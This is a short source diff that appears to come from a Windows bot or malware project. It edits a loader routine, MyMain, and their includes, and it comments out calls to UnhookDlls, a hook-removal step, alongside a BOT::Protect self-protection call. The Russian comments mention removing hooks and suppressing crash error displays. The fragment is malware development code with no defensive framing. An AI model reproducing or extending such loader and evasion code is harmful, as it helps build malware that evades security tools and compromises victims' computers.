@@ -18,7 +18,7 @@
 #include "Task.h"
 #include "md5.h"
 #include "BotDef.h"
-#include "DbgRpt.h"
+//#include "DbgRpt.h"
 #include "Modules.h"
 #include "BotDebug.h"
 
@@ -104,7 +104,8 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	
 	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());
 
-	UnhookDlls();
+	//UnhookDlls();
+
 	BOT::Protect(NULL);
 
 	// Отключаем отображение ошибок при крахе процесса
@@ -262,7 +263,7 @@ int APIENTRY MyMain()
 
 
 
-	UnhookDlls(); //снимаем хуки
+	//UnhookDlls(); //снимаем хуки
 
 	WCHAR ModulePath[MAX_PATH];
 
